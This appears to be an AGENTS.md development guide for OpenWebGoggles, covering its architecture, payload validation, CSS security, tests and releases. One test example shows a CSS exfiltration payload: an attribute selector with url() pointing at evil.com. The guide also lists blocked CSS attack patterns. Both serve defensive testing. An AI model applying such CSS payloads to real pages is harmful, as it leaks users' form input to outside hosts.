# AGENTS.md — Development Standards for OpenWebGoggles

This file captures architectural decisions, coding standards, and lessons learned from building OpenWebGoggles. Read this before making changes to avoid retreading solved problems.

## Project Layout

```
scripts/              Python source (NOT src/)
  mcp_server.py       MCP server — tools, session management, presets
  webview_server.py   HTTP + WebSocket server (raw asyncio, no framework)
  security_gate.py    SecurityGate — validates all state payloads before browser
  crypto_utils.py     Ed25519 + HMAC signing, NonceTracker
  tests/              pytest suite (748+ tests)
    conftest.py       Shared fixtures: gate, session_keys, nonce_tracker, session_token
    test_security_gate.py
    test_client_escaping.py
    test_mcp_server.py
assets/
  sdk/                Client JS SDK (openwebgoggles-sdk.js)
  apps/dynamic/       Built-in dynamic renderer
    index.html        Entry point — CSS variables, section styles, CSP nonce injection
    app.js            Orchestrator — WebSocket, state rendering, action dispatch
    utils.js          Escaping, sanitization, CSS validation, markdown rendering
    sections.js       Section type renderers (progress, log, diff, table, tabs, etc.)
    validation.js     Field validation engine (required, pattern, minLength, maxLength)
    behaviors.js      Conditional show/hide/enable/disable logic
  template/           App scaffold template for init_webview_app.sh
```

## JavaScript Architecture

### No Build Step — IIFE + OWG Namespace

All JS uses vanilla IIFE modules sharing `window.OWG`. No webpack, no bundler, no transpiler.

```javascript
// Every module follows this pattern:
(function () {
  "use strict";
  window.OWG = window.OWG || {};

  function myFunction() { /* ... */ }

  // Register on namespace
  OWG.myFunction = myFunction;
})();
```

**Load order matters.** In `index.html`:
1. `utils.js` (no dependencies)
2. `sections.js` (depends on utils)
3. `validation.js` (depends on utils)
4. `behaviors.js` (depends on utils)
5. `app.js` (orchestrator — depends on all above)

All script tags must have the CSP nonce: `<script nonce="{{NONCE}}" src="...">`. The server injects the nonce at request time.

### Prototype Pollution Prevention

- `formValues` and `fieldValidators` use `Object.create(null)` — no prototype chain
- `Object.freeze(window.OWG)` at the end of `app.js` — prevents post-init tampering

### DOM — No innerHTML

Never use `innerHTML` for user/agent-supplied content. Use:
- `document.createTextNode()` for plain text
- `OWG.sanitizeHTML()` for markdown (DOMPurify-based)
- DOM API (`createElement`, `appendChild`) for structure

The SecurityGate and client-side XSS scanner both block `<script>`, `<img>`, `<iframe>`, etc. This is defense-in-depth — don't rely on only one layer.

## Python Architecture

### SecurityGate — Rejection, Not Mutation

SecurityGate validates payloads and **rejects** invalid ones. It does NOT sanitize or modify data. If a field fails validation, the entire payload is rejected with an error message.

```python
ok, err, parsed = gate.validate_state(raw_json)
if not ok:
    return {"error": err}  # Reject the whole thing
```

This is intentional. Mutation-based sanitization is fragile (bypass via encoding tricks, double-encoding, etc.). Rejection is simpler to reason about and test.

### Key Validation Rules

| What | Constraint | Where |
|------|-----------|-------|
| Payload size | 512KB max | `MAX_PAYLOAD_SIZE` |
| String values | 50KB each | `MAX_STRING_LENGTH` |
| JSON nesting | 10 levels | `MAX_NESTING_DEPTH` |
| Tab nesting | 3 levels (sections) | `MAX_SECTION_DEPTH` |
| Sections | 50 max | `MAX_SECTIONS` |
| Custom CSS | 50KB, no `url()`, no `@import`, no `@font-face` | `DANGEROUS_CSS_PATTERNS` |
| Field patterns | No nested quantifiers (ReDoS) | `_is_redos_safe()` |
| Class names | `^[a-zA-Z][a-zA-Z0-9_ -]*$` | `CLASS_NAME_PATTERN` |
| Top-level keys | Allowlisted set only | `ALLOWED_TOP_KEYS` in `validate_state()` |
| Log lines | Each must be `str` | `_validate_section_specific()` |
| Field rows | int, 1-50 | `_validate_field()` |
| Field placeholder | str, max 500 chars | `_validate_field()` |

### Thread Safety

`merge_state()` in `mcp_server.py` wraps read-merge-write in a `threading.Lock()` to prevent TOCTOU race conditions. Any new file-based read-modify-write cycles must also be locked.

### Post-Merge Re-validation

When `webview_update(merge=True)` is used, the **merged result** must be re-validated through SecurityGate. Two individually valid payloads can merge into an invalid one (e.g., a merge that introduces an unknown top-level key).

## CSS Security

### Server-Side: Block All External Resources

`DANGEROUS_CSS_PATTERNS` blocks:
- ALL `url()` — not just `javascript:` URLs. Attribute selectors + `url(https://...)` enable data exfiltration character-by-character
- `@font-face` — `unicode-range` + external font URLs leak form values
- `@import`, `@charset`, `@namespace` — external resource loading / parsing context override
- CSS hex/unicode escapes (`\0062`, `\u0062`) — obfuscation of dangerous values
- `expression()`, `-moz-binding`, `behavior:` — legacy browser code execution

### Client-Side: CSS Scoping

`_scopeCSS()` in `utils.js` prepends `#content` to all custom CSS selectors. This prevents agent-supplied CSS from defacing security-critical UI elements (header, session badge, connection indicator).

### Client-Side: Sync with Server

The client `DANGEROUS_CSS_RE` in `utils.js` must stay synced with the server's `DANGEROUS_CSS_PATTERNS`. If you add a new server-side pattern, add it client-side too.

### sidebarWidth Validation

Both server (`CSS_LENGTH_PATTERN`) and client validate CSS length values with `/^[0-9]+(px|em|rem|%)$/`. Invalid values fall back to `300px`.

## Testing Standards

### Test Organization

Tests are organized by component with class-based grouping:

```python
class TestCSSExfilPrevention:
    """Tests for blocking CSS data exfiltration vectors."""

    def test_url_https_blocked(self, gate):
        state = {"custom_css": "input[value^='a'] { background: url(https://evil.com/a) }"}
        ok, err, _ = gate.validate_state(json.dumps(state))
        assert not ok
```

Use the `gate` fixture from `conftest.py` — don't instantiate `SecurityGate()` inline.

### OWASP / MITRE Markers

Tag security tests with framework markers for traceability:

```python
@pytest.mark.owasp_a03  # Injection
@pytest.mark.llm01      # Prompt injection
@pytest.mark.mitre_t1059  # Command and scripting interpreter
```

### Top-Level Key Allowlist Gotcha

If you add a new top-level state key (e.g., `"theme"`), you must:
1. Add it to `ALLOWED_TOP_KEYS` in `security_gate.py`
2. Update any nesting depth tests that construct state — unknown keys are rejected before depth checking

This bit us when tests used arbitrary key names like `{"nested": {...}}` at the top level. After adding the allowlist, those tests broke because `nested` wasn't an allowed key. Always nest test data under `"data"`.

### JSON Nesting Depth vs Section Depth

Two separate limits:
- `MAX_NESTING_DEPTH = 10` — overall JSON structure depth (counts every dict/list level)
- `MAX_SECTION_DEPTH = 3` — tabs-within-tabs nesting only

A single level of tabs nesting creates ~5 levels of JSON depth. Two levels of tabs nesting = ~11 JSON levels, which **exceeds** `MAX_NESTING_DEPTH`. This is by design — deeply nested tabs are impractical for users anyway. Don't write tests expecting 2+ levels of tabs nesting to pass.

### Ruff Linting

Pre-commit hooks run ruff lint (`--fix`) and ruff format on every commit. Key rules:

- `UP038`: Use `isinstance(x, int | float)` not `isinstance(x, (int, float))` — Python 3.10+ union syntax
- `S105`: "Possible hardcoded password" — triggers on string assignments to variables named `token`, `password`, etc. Suppress with `# noqa: S105` (NOT `# nosec` — that's bandit, not ruff)
- `S101`: `assert` is fine in tests (suppressed in `pyproject.toml` per-file-ignores)

Ruff format may reformat your code between the first and second pre-commit pass. If the commit fails twice, check whether ruff reformatted files — you may need to re-stage.

### Test File References After Refactoring

When functions move between JS files (e.g., `esc()` moved from `app.js` to `utils.js`), update all test file path references in `test_client_escaping.py`. Tests that read JS source files to verify function presence will break if they look in the wrong file.

Check for both declaration patterns:
- `function esc(` (named function declaration)
- `.esc = function` (namespace assignment)

## Release Process

### Publish Workflow Trigger

The PyPI publish workflow triggers on `release: [published]`, **NOT** on tag push. The sequence is:

1. Bump version in `pyproject.toml`
2. Update `CHANGELOG.md`
3. Commit and push
4. `git tag v0.X.0 && git push --tags`
5. **`gh release create v0.X.0 --title "..." --notes "..."`** ← this triggers publish

If you only push the tag without creating a GitHub Release, nothing gets published.

### Version Matching

The publish workflow verifies `pyproject.toml` version matches the git tag (without `v` prefix). Mismatches fail the build.

## Security Architecture — What to Know

### Nine Defense Layers

1. Localhost-only binding (127.0.0.1)
2. Bearer token auth (32-byte, constant-time comparison)
3. WebSocket first-message auth
4. Ed25519 signatures (server → browser)
5. HMAC-SHA256 (browser → server)
6. Nonce replay prevention
7. CSP with per-request nonce (HTTP header, not meta tag)
8. SecurityGate validation
9. Rate limiting (30 actions/min)

### CSP Is Via HTTP Header

CSP is delivered via the `Content-Security-Policy` HTTP header in `webview_server.py`, not a `<meta>` tag. HTTP headers are more secure — they can't be overridden by injected HTML.

### Token Stripping

Session tokens must be stripped from any data broadcast over WebSocket. The HTTP manifest endpoint and the WS manifest broadcast both redact `session.token` to `"REDACTED"`.

### Close Message XSS

The close message passed to `webview_close()` is XSS-scanned before being broadcast. If it fails, it falls back to `"Session complete."`.

## Common Pitfalls

### Context Overflow

Large agent results can overflow the context window. When using sub-agents for analysis:
- Set size limits on findings
- Use JSON-formatted summaries, not raw dumps
- Don't return entire file contents — return line numbers and snippets

### Deep Merge Semantics

`_deep_merge()` follows these rules:
- `dict + dict` → recursive merge
- `list + list` → **replace** (NOT append)
- anything else → override wins

This means you can't incrementally append to a list with merge. To add items to `tasks`, send the full updated list.

### File-Based Data Contract

The agent ↔ browser interface is three JSON files in `.openwebgoggles/`:
- `state.json` — agent → browser (what to show)
- `actions.json` — browser → agent (what the human decided)
- `manifest.json` — shared session config

The server watches these files and pushes changes via WebSocket. You can debug by `cat`-ing these files directly.

### ANSI Color Rendering

`escAnsi()` in `utils.js` converts ANSI escape codes to `<span>` tags. It tracks open/close count to prevent unclosed span accumulation. If you modify this function, ensure:
- `</span>` only emits when `openCount > 0`
- Remaining open spans are closed at the end of the string
- Reset (`\033[0m`) closes all open spans

### Preset Expansion

`_expand_preset()` transforms shorthand state into full state objects. Presets:
- `progress` → `{tasks: [...], percentage: N}` → wraps in progress section + actions
- `confirm` → `{title, message, details?}` → wraps in text section + approve/reject
- `log` → `{lines: [...], maxLines?}` → wraps in log section

Presets expand **before** SecurityGate validation, so the expanded state must also be valid.
